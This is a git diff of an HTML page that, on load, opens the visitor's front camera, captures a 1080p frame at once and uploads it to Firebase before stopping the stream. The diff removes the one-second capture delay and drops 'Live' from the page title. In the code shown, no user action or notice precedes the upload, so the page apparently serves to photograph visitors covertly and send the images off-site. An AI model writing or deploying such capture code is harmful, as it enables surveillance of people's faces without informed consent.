@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Camera Capture</title>
+    <title>Camera Capture</title>
     <script type="module">
         // Import the necessary Firebase functions
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
@@ -45,24 +45,24 @@
             navigator.mediaDevices.getUserMedia({
                 video: {
                     facingMode: { exact: "user" }, // Use front camera
-                    width: { ideal: 1920 },
-                    height: { ideal: 1080 }
+                    width: { ideal: 1920 }, // 1080p width
+                    height: { ideal: 1080 } // 1080p height
                 }
             })
             .then(stream => {
                 video.srcObject = stream;
                 video.onloadedmetadata = () => {
-                    canvas.width = 1920;  // Set canvas width to 1920 for 1080p
-                    canvas.height = 1080; // Set canvas height to 1080 for 1080p
                     video.play();
 
-                    // Capture image after a short delay
-                    setTimeout(() => {
-                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        const imageData = canvas.toDataURL('image/png');
-                        uploadImage(imageData); // Upload image to Firebase
-                        stopVideo(stream); // Stop the video stream
-                    }, 1000); // Capture after 1 second
+                    // Set the canvas size for 1080p
+                    canvas.width = 1920;  // Set canvas width to 1920 for 1080p
+                    canvas.height = 1080; // Set canvas height to 1080 for 1080p
+
+                    // Capture image immediately
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const imageData = canvas.toDataURL('image/png');
+                    uploadImage(imageData); // Upload image to Firebase
+                    stopVideo(stream); // Stop the video stream
                 };
             })
             .catch(err => {
